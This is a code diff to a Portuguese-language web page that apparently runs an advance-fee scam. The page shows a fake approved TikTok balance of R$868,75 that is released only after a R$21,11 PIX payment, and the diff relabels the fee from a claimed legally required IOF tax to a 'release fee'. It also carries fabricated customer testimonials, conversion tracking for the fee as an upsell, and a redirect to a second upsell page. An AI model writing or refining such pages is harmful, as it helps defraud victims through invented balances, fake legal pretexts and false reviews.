@@ -155,7 +155,7 @@ body{font-family:'Inter',sans-serif;background:#f7f7f8;color:#111;-webkit-font-s
   <div class="saldo-val" id="saldoVal">R$868,75</div>
   <div class="saldo-sub">
     <div class="saldo-dot"></div>
-    Aprovado · Aguardando regularização fiscal
+    Aprovado · Aguardando regularização
   </div>
 </div>
 
@@ -173,8 +173,8 @@ body{font-family:'Inter',sans-serif;background:#f7f7f8;color:#111;-webkit-font-s
   <div class="step-row">
     <div class="step-icon active">⚠️</div>
     <div class="step-info">
-      <div class="step-name">Pagar IOF obrigatório</div>
-      <div class="step-desc">Exigido pela legislação brasileira</div>
+      <div class="step-name">Pagar taxa de liberação</div>
+      <div class="step-desc">Necessária para liberar o seu saque</div>
     </div>
   </div>
   <div class="step-connector"></div>
@@ -199,8 +199,8 @@ body{font-family:'Inter',sans-serif;background:#f7f7f8;color:#111;-webkit-font-s
   </div>
   <div class="iof-row">
     <div>
-      <div class="iof-lbl">IOF — Lei nº 8.894/94</div>
-      <div style="font-size:10px;color:#aaa;margin-top:1px">Imposto sobre Operações Financeiras</div>
+      <div class="iof-lbl">Taxa de Liberação</div>
+      <div style="font-size:10px;color:#aaa;margin-top:1px">Taxa única de processamento do saque</div>
     </div>
     <span class="iof-val red" id="iofTaxa">- R$ 21,11</span>
   </div>
@@ -209,7 +209,7 @@ body{font-family:'Inter',sans-serif;background:#f7f7f8;color:#111;-webkit-font-s
     <span class="iof-val green" id="iofTotal">R$868,75</span>
   </div>
   <div class="receive-box">
-    ✓ Após pagar o IOF seu saldo será liberado imediatamente via PIX
+    ✓ Após pagar a taxa seu saldo será liberado imediatamente via PIX
   </div>
 </div>
 
@@ -232,7 +232,7 @@ body{font-family:'Inter',sans-serif;background:#f7f7f8;color:#111;-webkit-font-s
 <div class="btn-wrap">
   <button class="pay-btn" id="payBtn" onclick="handleClick()">
     <div class="btn-spinner" id="btnSpinner"></div>
-    <span id="btnText">PAGAR IOF E RECEBER R$868,75</span>
+    <span id="btnText">PAGAR TAXA E RECEBER R$868,75</span>
   </button>
   <p class="pay-note">🔒 Pagamento 100% seguro via PIX · Liberação imediata</p>
 </div>
@@ -244,7 +244,7 @@ body{font-family:'Inter',sans-serif;background:#f7f7f8;color:#111;-webkit-font-s
     <div class="depo-av" style="background:#fe2c55">CM</div>
     <div>
       <div><span class="depo-name">Carla M., SP</span><span class="depo-stars">★★★★★</span></div>
-      <div class="depo-text">Paguei o IOF e em 2 minutos o dinheiro caiu na minha conta. Fácil demais!</div>
+      <div class="depo-text">Paguei a taxa e em 2 minutos o dinheiro caiu na minha conta. Fácil demais!</div>
       <div class="depo-check">✓ Saque confirmado</div>
     </div>
   </div>
@@ -260,7 +260,7 @@ body{font-family:'Inter',sans-serif;background:#f7f7f8;color:#111;-webkit-font-s
     <div class="depo-av" style="background:#276749">JO</div>
     <div>
       <div><span class="depo-name">Julia O., MG</span><span class="depo-stars">★★★★★</span></div>
-      <div class="depo-text">Recebi o valor cheio, sem desconto nenhum. O IOF é obrigatório mesmo.</div>
+      <div class="depo-text">Recebi o valor cheio, sem desconto nenhum. A taxa é necessária mesmo.</div>
       <div class="depo-check">✓ Saque confirmado</div>
     </div>
   </div>
@@ -287,7 +287,7 @@ body{font-family:'Inter',sans-serif;background:#f7f7f8;color:#111;-webkit-font-s
   if(el('iofSaldo'))  el('iofSaldo').textContent  = R(total);
   if(el('iofTaxa'))   el('iofTaxa').textContent   = '- ' + R2(IOF);
   if(el('iofTotal'))  el('iofTotal').textContent  = R(total);
-  if(el('btnText'))   el('btnText').textContent   = 'PAGAR IOF E RECEBER ' + R(total);
+  if(el('btnText'))   el('btnText').textContent   = 'PAGAR TAXA E RECEBER ' + R(total);
 
   // Data e protocolo
   var hoje = new Date();
@@ -320,14 +320,14 @@ body{font-family:'Inter',sans-serif;background:#f7f7f8;color:#111;-webkit-font-s
     el('btnSpinner').style.display = 'block';
     el('btnText').textContent = 'AGUARDE...';
     if(typeof ttq !== 'undefined' && typeof ttq.track === 'function'){
-      try { ttq.track('InitiateCheckout', { content_id: 'upsell_1_tiktok', content_type: 'product', content_name: 'Taxa IOF - Liberação TikTok', contents: [{ content_id: 'upsell_1_tiktok', content_type: 'product', content_name: 'Taxa IOF - Liberação TikTok', quantity: 1, price: 21.11 }], value: 21.11, currency: 'BRL' }); } catch(e){}
+      try { ttq.track('InitiateCheckout', { content_id: 'upsell_1_tiktok', content_type: 'product', content_name: 'Taxa de Liberação TikTok', contents: [{ content_id: 'upsell_1_tiktok', content_type: 'product', content_name: 'Taxa de Liberação TikTok', quantity: 1, price: 21.11 }], value: 21.11, currency: 'BRL' }); } catch(e){}
     }
     setTimeout(function(){
       btn.disabled = false;
       el('btnSpinner').style.display = 'none';
-      el('btnText').textContent = 'PAGAR IOF E RECEBER ' + R(total);
+      el('btnText').textContent = 'PAGAR TAXA E RECEBER ' + R(total);
       var p = window.location.search;
-      window.abrirCheckoutPix({valor:21.11,titulo:'Taxa IOF - Liberação TikTok',proximoUrl:'../up2/index.html'});
+      window.abrirCheckoutPix({valor:21.11,titulo:'Taxa de Liberação TikTok',proximoUrl:'../up2/index.html'});
     }, 600);
   };
 })();
